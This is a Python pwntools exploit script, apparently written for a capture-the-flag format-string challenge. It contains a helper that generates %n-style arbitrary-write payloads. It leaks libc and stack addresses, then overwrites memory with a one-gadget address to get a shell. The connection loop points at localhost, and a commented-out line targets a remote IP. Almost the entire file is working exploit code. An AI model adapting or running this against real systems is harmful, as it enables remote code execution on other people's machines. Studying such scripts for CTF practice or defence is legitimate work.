#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
libc = ELF('./libc.so.6')

def format_str(plist, fixed=False):
    s = ''
    ttl = 0
    blk = 0
    cnt = 0

    # l = (pos, value, size)
    idx = 0
    while idx < len(plist):
        pos, val, size = plist[idx]
        mx = 2**(size*8)
        cnt += 1

        if not fixed:
            if pos == blk+1:
                if val != ttl % mx:
                    raise Exception('No enough block to adjust value')
                else:
                    pass
            elif pos > blk+1:
                s += '%c'*(pos-blk-2)
                ttl += pos-blk-2
                blk += pos-blk-2
                exceed = ttl % mx
                if exceed > val:
                    s += '%{}c'.format(mx - exceed + val)
                    ttl += mx - exceed + val
                    blk += 1
                elif exceed < val:
                    s += '%{}c'.format(val - exceed)
                    ttl += val - exceed
                    blk += 1
                else:
                    pass
            else:
                fixed = True
                continue
        else:
            # if it's the final one than use '$' sign
            exceed = ttl % mx
            if exceed > val:
                s += '%{}c'.format(mx - exceed + val)
                ttl += mx - exceed + val
                blk += 1
            elif exceed < val:
                s += '%{}c'.format(val - exceed)
                ttl += val - exceed
                blk += 1
            else:
                pass

        if not fixed:
            if size == 8:
                s += '%ln'
            elif size == 4:
                s += '%n'
            elif size == 2:
                s += '%hn'
            else:
                s += '%hhn'
        else:
            if size == 8:
                s += '%{}$ln'.format(pos)
            elif size == 4:
                s += '%{}$n'.format(pos)
            elif size == 2:
                s += '%{}$hn'.format(pos)
            else:
                s += '%{}$hhn'.format(pos)
        blk += 1
        idx += 1

    return s+'\x00'

#payload = '%c'*6+'%34c'+'%hhn'+'%c'*2+'%30c'+'%hhn'+'AAAAAAAA'
#payload = '%c'*6+'%34c'+'%hhn'+'%c'*2+'%246c'+'%hhn'+'AAAAAAAA' # crash???? I don't know why
#payload = '%c'*6+'%34c'+'%hhn'+'%c'*2+'%148c'+'%hhn'+'AAAAAAAA'
payload = format_str([
    (8, 0x28, 1),
    (12, 0x21, 1)
])
payload2 = '%17$lxGG%12$lxYY'


while True:
    try:
        #r = remote('46.101.255.206', 19199)
        r = remote('localhost', 4000)
        r.sendafter('1: ', payload)
        r.sendafter('2: ', payload2)
        leak = int(r.recvuntil('GG', timeout=5)[-2-2*6:-2],16) - 0x21b97
        stack = int(r.recvuntil('YY', timeout=5)[-2-2*6:-2],16)
        print hex(leak)
        print hex(stack)
        libc.address = leak
        magic = leak + 0x10a38c
        magic1 = magic % 0x1000000
        magic2 = magic // 0x1000000
        payload3 = format_str([
            (6, 0x38, 1),
            (10, magic1, 8)
        ])
        payload4 = format_str([
            (6, 0x3b, 1),
            (10, magic2, 4)
        ])
        print payload3
        r.sendafter('1: ', payload3)
        r.sendafter('2: ', payload4)
        b = r.recv()
        r.interactive()
    except Exception:
        r.close()
        pass
